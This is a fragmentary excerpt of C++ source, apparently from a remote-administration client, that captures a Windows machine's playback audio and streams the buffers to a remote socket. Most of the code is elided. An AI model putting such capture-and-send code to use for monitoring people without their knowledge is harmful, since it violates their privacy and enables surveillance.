...
#include <winsock2.h>
#include "../../PublicInclude/ClientSocket.h"
...
UINT CaptureAudio(CClientSocket* ClientObjectsec, IMMDevice* pDevice, HANDLE hEventStarted, HANDLE hEventStop)
{
	HRESULT hr;
...
//////////////////
	...
	//复制缓冲区
				memcpy(senddate + 1, pData, nNumFramesToRead * pwfx->nBlockAlign);
					ClientObjectsec->Send((LPBYTE)senddate, nNumFramesToRead * pwfx->nBlockAlign+1);
...
UINT __stdcall CaptureTheadProc(LPVOID param)
{
	...
	CClientSocket* ClientObjectsec = pData->ClientObjectsec;
	HANDLE hEventStop = pData->hEventStop;
	IMMDevice* pDevice = pData->pDevice;
	HANDLE hEventStarted = pData->hEventStarted;

	UINT nRet = CaptureAudio(ClientObjectsec, pDevice, hEventStarted, hEventStop);
...
BOOL CPlaybackCaptureImpl::Initialize(CClientSocket* ClientObject)
{
...
BOOL CPlaybackCaptureImpl::Start()
{
	...
	data.ClientObjectsec = ClientObjectsec;
